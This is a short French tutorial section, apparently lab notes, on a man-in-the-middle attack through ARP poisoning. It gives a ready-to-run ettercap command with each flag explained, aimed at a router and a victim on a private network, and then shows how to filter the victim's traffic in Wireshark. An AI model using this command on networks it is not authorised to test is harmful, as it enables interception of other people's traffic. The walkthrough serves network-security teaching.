# 2. Attaque "Man in the Middle" (MITM) en utilisant du ARP Poisoning

```bash
# -T : indique que l'on veut que du texte en sortie (`printf`) (nous utiliserons Wireshark plus tard)
# -S : on ne fait pas de certificat SSL. on ne pourra donc pas intercepter le traffic https mais c'est suffisant pour notre exemple
# -i : interface réseau
# -M :  indique que l'on veut activer l'attaque man in the middle
#       arp:remote // on veut faire une attaque ARP
sudo ettercap -T -S -i wlan0 -M arp:remote /10.0.0.1// /10.0.0.129//
#                                                  ^ routeur   ^^^ la machine qu'on veut attaquer
```

On ouvre **Wireshark** sur l'interface `wlan0`.

Ici, on peut appliquer des filtres tel que `ip.addr == 10.0.0.129`
qui va uniquement afficher les requêtes de l'appareil qu'on veut attaquer.

Maintenant on peut voir toutes les requêtes effectuées.
